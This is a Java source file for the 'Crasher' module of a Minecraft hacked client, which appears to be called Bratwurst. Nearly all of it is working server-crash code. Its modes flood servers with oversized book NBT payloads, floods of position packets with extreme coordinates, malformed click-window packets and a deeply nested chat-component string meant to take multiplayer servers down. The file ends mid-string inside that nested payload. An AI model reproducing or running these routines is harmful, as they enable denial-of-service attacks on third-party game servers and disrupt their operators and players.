package me.bratwurst.module.modules.Crasher;

import com.google.gson.JsonElement;
import com.google.gson.JsonObject;
import de.Hero.settings.Setting;
import io.netty.buffer.Unpooled;
import me.bratwurst.Client;
import me.bratwurst.event.EventTarget;
import me.bratwurst.event.events.EventMotionUpdate;
import me.bratwurst.module.Category;
import me.bratwurst.module.Module;
import me.bratwurst.utils.TimeHelper;
import me.bratwurst.utils.player.PlayerUtils;
import net.minecraft.block.Block;
import net.minecraft.client.Minecraft;
import net.minecraft.entity.player.EntityPlayer;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTBase;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.Packet;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.*;
import net.minecraft.util.BlockPos;
import net.minecraft.util.ChatComponentText;
import net.minecraft.util.EnumChatFormatting;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.Random;

public class Crasher extends Module {
    public Setting Packets, Bypass, Range, MoveFix;
    public static Setting mode1;

    public Crasher() {
        super("Crasher", Category.EXPLOIT);
        ArrayList<String> options = new ArrayList<>();
        options.add("Color");
        options.add("Singlepacket");
        options.add("Fly");
        options.add("Exploitfix");
        options.add("Netty");
        options.add("Netty2");
        options.add("Mineplex");
        options.add("CustomPayload");
        options.add("Nullbook");
        options.add("OpenBook");
        options.add("AAC");
        options.add("Move");
        options.add("Exception");
        options.add("NCP");
        options.add("Replay");
        options.add("Onground");
        options.add("Multi");
        options.add("Massive");
        options.add("BookFlood");
        Client.setmgr.rSetting(mode1 = new Setting("Crasher Mode", this, "Singlepacket", options));
    }

    @Override
    public void setup() {

        Client.setmgr.rSetting(Packets = new Setting("Packets", this, 10, 1, 50, false));

    }

    @EventTarget
    public void onUpdate(EventMotionUpdate e) {
        if (mc.getCurrentServerData().serverIP.contains("Crafting-table.de")) {

            PlayerUtils.sendMessage("Dieser Server Darf nicht gecrasht werden LG Bratwurst001");
            return;
        }

        PlayerUtils.sendMessage(EnumChatFormatting.AQUA + "Bypass mode Ativiert", true);
        if (mode1.getValString().equalsIgnoreCase("Singlepacket")) {
            Singlepacket();
        } else if (mode1.getValString().equalsIgnoreCase("Color")) {
            ServerCrash();
        } else if (mode1.getValString().equalsIgnoreCase("Fly")) {
            crypto();
        } else if (mode1.getValString().equalsIgnoreCase("Exploitfix")) {
            Exploitfix();
        } else if (mode1.getValString().equalsIgnoreCase("Netty")) {
            Netty();
        } else if (mode1.getValString().equalsIgnoreCase("Mineplex")) {
            MinePlex();
        } else if (mode1.getValString().equalsIgnoreCase("Singlepacket")) {
            Singlepacket();
        } else if (mode1.getValString().equalsIgnoreCase("CustomPayload")) {
            CustomPayload();
        } else if (mode1.getValString().equalsIgnoreCase("Nullbook")) {
            nullbook();
        } else if (mode1.getValString().equalsIgnoreCase("OpenBook")) {
            OpenBook();
        } else if (mode1.getValString().equalsIgnoreCase("AAC")) {
            AAC();
        } else if (mode1.getValString().equalsIgnoreCase("Netty2")) {
            Nettyy();
        } else if (mode1.getValString().equalsIgnoreCase("Move")) {
            move();
        } else if (mode1.getValString().equalsIgnoreCase("Exception")) {
            Exception();
        } else if (mode1.getValString().equalsIgnoreCase("NCP")) {
            ncp();
        } else if (mode1.getValString().equalsIgnoreCase("Replay")) {
            Replay();
        } else if (mode1.getValString().equalsIgnoreCase("Onground")) {
            Onground();
        } else if (mode1.getValString().equalsIgnoreCase("Multi")) {
            Multi();
        }else if (mode1.getValString().equalsIgnoreCase("Massive")) {
            Massiv();
        }else if (mode1.getValString().equalsIgnoreCase("BookFlood")) {
            BookFlood();
        }


    }
    public void BookFlood() {
        ItemStack bookStack = new ItemStack(Items.writable_book);
        NBTTagCompound bookCompound = new NBTTagCompound();
        bookCompound.setString("author", "aaa");
        bookCompound.setString("title", "asd");
        NBTTagList pageList = new NBTTagList();
        String pageText = "asdas1d2asda";
        for (int page = 0; page < 50; ++page) {
            pageList.appendTag(new NBTTagString("asdas1d2asda"));
        }
        bookCompound.setTag("pages", pageList);
        bookStack.setTagCompound(bookCompound);
        for (int packets = 0; packets < 100; ++packets) {
            PacketBuffer packetBuffer = new PacketBuffer(Unpooled.buffer());
            packetBuffer.writeItemStackToBuffer(bookStack);
            mc.thePlayer.sendQueue.addToSendQueue(new C17PacketCustomPayload(new Random().nextBoolean() ? "MC|BSign" : "MC|BEdit", packetBuffer));
        }
        toggle();
    }
    public void Massiv(){
        for (double i2 = mc.thePlayer.posY; i2 < 255.0; i2 += 5.0) {
            mc.thePlayer.sendQueue.addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(Minecraft.getMinecraft().thePlayer.posX, i2, Minecraft.getMinecraft().thePlayer.posZ, true));
        }
        for (int i3 = 0; i3 < 6685; i3 += 5) {
            mc.thePlayer.sendQueue.addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(Minecraft.getMinecraft().thePlayer.posX + (double)i3, 255.0, Minecraft.getMinecraft().thePlayer.posZ + (double)i3, true));
        }
        toggle();
    }

 public void Multi(){
     Minecraft mc = Minecraft.getMinecraft();
     for (int i = 0; i < 1000; ++i) {
         mc.thePlayer.sendQueue.addToSendQueue(
                 new C0EPacketClickWindow(0, -999, 0, 1, bigBook(), (short) 0));
     }
     toggle();
 }
    public void AAC() {
        for (int index2 = 0; index2 < 9999; ++index2) {
            mc.thePlayer.sendQueue.addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(Minecraft.getMinecraft().thePlayer.posX + (double) (9412 * index2), Minecraft.getMinecraft().thePlayer.getEntityBoundingBox().minY + (double) (9412 * index2), Minecraft.getMinecraft().thePlayer.posZ + (double) (9412 * index2), true));
        }
    }


    public void ncp() {
        mc.thePlayer.sendQueue.addToSendQueue(new C03PacketPlayer.C05PacketPlayerLook(9.223372E18f, 9.223372E18f, true));
    }

    public void Onground() {
        for (int i = 0; i < 3000; ++i) {
            mc.thePlayer.sendQueue.addToSendQueue(new C03PacketPlayer(new Random().nextBoolean()));
        }
        toggle();
    }

    public void Replay() {
        mc.thePlayer.sendQueue.addToSendQueue(new C01PacketChatMessage("/replay 我将尽其所能地将你的悲惨的�?股�?。我将尽其所能地将你的悲惨的�?股�?。我将尽其所能地将你的悲惨的�?股�?。我将尽其所能地将你的悲惨的�?股�?。我将尽其所能地将你的悲惨的�?股�?。我将尽其所能地将你的悲惨的�?股�?。我将尽其所能地将你的悲惨的�?股�?。我将尽其所能地将你的悲惨的�?股�?"));
    }

    public void Exception() {
        Minecraft mc = Minecraft.getMinecraft();
        mc.thePlayer.sendQueue.addToSendQueue(new C0EPacketClickWindow(0, -2, 0, 3, (ItemStack) null, (short) 1));
    }
    public ItemStack bigBook() {
        ItemStack itemStack = new ItemStack(Items.writable_book);
        NBTTagCompound bookCompound = new NBTTagCompound();
        String author = Minecraft.getMinecraft().getSession().getUsername();
        String title = "Play with me.";
        String size = "4567238567845678945678956782984567890187456789024567815467894067345739374632493246348465438436542376452386453645234763254872345324897245672385678456789456789567829845678901874567890245678154678940673457393746324932463484654384365423764523864536452347632548723453248972456723856784567894567895678298456789018745678902456781546789406734573937463249324634846543843654237645238645364523476325487234532489724567238567845678945678956782984567890187456789024567815467894067345739374632493246348465438436542376452386453645234763254872345324897245672385678456789456789567829845678901874567890245678154678940673457393746324932463484654384365423764523864536452347632548723453248972";
        bookCompound.setString("author", author);
        bookCompound.setString("title", title);
        NBTTagList pageList = new NBTTagList();
        String pageText = size;


        for(int page = 0; page < 50; ++page) {
            pageList.appendTag(new NBTTagString(pageText));
        }

        bookCompound.setTag("pages", pageList);
        itemStack.setTagCompound(bookCompound);
        return itemStack;
    }
    public static int move = 0;

    public void move() {
        if (mc.thePlayer.moveForward != 0) {
            move++;
            double x = Minecraft.getMinecraft().thePlayer.posX;
            double y = Minecraft.getMinecraft().thePlayer.posY;
            double z = Minecraft.getMinecraft().thePlayer.posZ;
            double d1 = 0.0;
            for (int i2 = 0; i2 < 10; ++i2) {
                for (int i3 = 0; i3 < 10000; ++i3) {
                    d1 = i3 * 9;
                    mc.thePlayer.sendQueue.addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(x, y, z + d1, false));
                }
            }
            if (move == 3) {
                toggle();
            }
        }

    }

    public void Nettyy() {

        ItemStack book = new ItemStack(Items.writable_book);
        mc.thePlayer.sendQueue.addToSendQueue(new C0EPacketClickWindow(0, 500, 2, 1, book, (short) -999));
    }

    public void OpenBook() {
        try {
            ItemStack book = new ItemStack(Items.writable_book);
            NBTTagList list = new NBTTagList();
            NBTTagCompound tag = new NBTTagCompound();
            String author = Minecraft.getMinecraft().getSession().getUsername();
            String title = "Play with me.";
            String size = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
            for (int i2 = 0; i2 < 50; ++i2) {
                String siteContent = size;
                NBTTagString tString = new NBTTagString(siteContent);
                list.appendTag(tString);
            }
            tag.setString("author", author);
            tag.setString("title", title);
            tag.setTag("pages", list);
            book.setTagInfo("pages", list);
            book.setTagCompound(tag);
            mc.thePlayer.sendQueue.addToSendQueue(new C08PacketPlayerBlockPlacement(new BlockPos(Minecraft.getMinecraft().thePlayer.posX, Minecraft.getMinecraft().thePlayer.posY - 2.0, Minecraft.getMinecraft().thePlayer.posZ), 1, book, 0.0f, 0.0f, 0.0f));
        } catch (Exception e2) {
            return;
        }
    }

    public void CustomPayload() {
        ItemStack book = new ItemStack(Items.writable_book);
        PacketBuffer packetBuffer = new PacketBuffer(Unpooled.buffer());
        packetBuffer.writeItemStackToBuffer(book);
        mc.thePlayer.sendQueue.addToSendQueue(new C17PacketCustomPayload(new Random().nextBoolean() ? "MC|BSign" : "MC|BEdit", packetBuffer));

    }

    public void nullbook() {
        NBTTagList bookPages = new NBTTagList();
        for (int i2 = 0; i2 < 16300; ++i2) {
            bookPages.appendTag(new NBTTagString(""));
        }
        for (int i3 = 0; i3 < 10; ++i3) {
            ItemStack book = new ItemStack(Items.writable_book);
            book.setTagInfo("pages", bookPages);
            PacketBuffer pb = new PacketBuffer(Unpooled.buffer());
            pb.writeItemStackToBuffer(book);
            mc.thePlayer.sendQueue.addToSendQueue(new C17PacketCustomPayload("MC|BEdit", pb));
        }
    }


    public void ServerCrash() {
        Minecraft mc = Minecraft.getMinecraft();
        final PacketBuffer buffer = new PacketBuffer(Unpooled.buffer());
        final ItemStack item = new ItemStack(Items.writable_book);
        final NBTTagCompound nbt = new NBTTagCompound();
        final NBTTagList pages = new NBTTagList();
        final NBTTagString page = new NBTTagString(
                "a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a�0a");
        for (int i = 0; i < 2; ++i) {
            pages.appendTag((NBTBase) page);
        }
        nbt.setTag("pages", (NBTBase) pages);
        nbt.setTag("author", (NBTBase) new NBTTagString("MEDDL"));
        nbt.setTag("title", (NBTBase) new NBTTagString("LEUDE"));
        buffer.writeItemStackToBuffer(item);
        mc.thePlayer.sendQueue.addToSendQueue(new C17PacketCustomPayload("MC|BEdit", buffer));
    }

    public void crypto() {
        int time = 0;
        while ((double) time < 10) {
            ItemStack bookObj = new ItemStack(Items.writable_book);
            NBTTagList bookPages = new NBTTagList();
            for (int i = 0; i < 4000; ++i) {
                bookPages.appendTag(new NBTTagString("a"));
            }
            while (bookPages.tagCount() > 1) {
                String s2 = bookPages.getStringTagAt(bookPages.tagCount() - 1);
                if (s2.length() != 0) break;
                bookPages.removeTag(bookPages.tagCount() - 1);
            }
            if (bookObj.hasTagCompound()) {
                NBTTagCompound nbttagcompound = bookObj.getTagCompound();
                nbttagcompound.setTag("pages", bookPages);
            } else {
                bookObj.setTagInfo("pages", bookPages);
            }
            PacketBuffer packetbuffer = new PacketBuffer(Unpooled.buffer());
            packetbuffer.writeItemStackToBuffer(bookObj);
            mc.thePlayer.sendQueue.addToSendQueue(new C17PacketCustomPayload("MC|BEdit", packetbuffer));
            bookObj.setTagInfo("author", new NBTTagString("a"));
            bookObj.setTagInfo("title", new NBTTagString("a"));
            for (int i = 0; i < bookPages.tagCount(); ++i) {
                String s1 = bookPages.getStringTagAt(i);
                ChatComponentText chatComponentText = new ChatComponentText(s1);
                s1 = ChatComponentText.Serializer.componentToJson(chatComponentText);
                bookPages.set(i, new NBTTagString(s1));
            }
            packetbuffer = new PacketBuffer(Unpooled.buffer());
            packetbuffer.writeItemStackToBuffer(bookObj);
            mc.thePlayer.sendQueue.addToSendQueue(new C17PacketCustomPayload("MC|BSign", packetbuffer));
            ++time;
        }

    }


    public void Singlepacket() {
        PlayerUtils.sendMessage(EnumChatFormatting.RED + "Crashing....");
        NBTTagCompound comp = new NBTTagCompound();
        NBTTagList list = new NBTTagList();
        String row = "{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}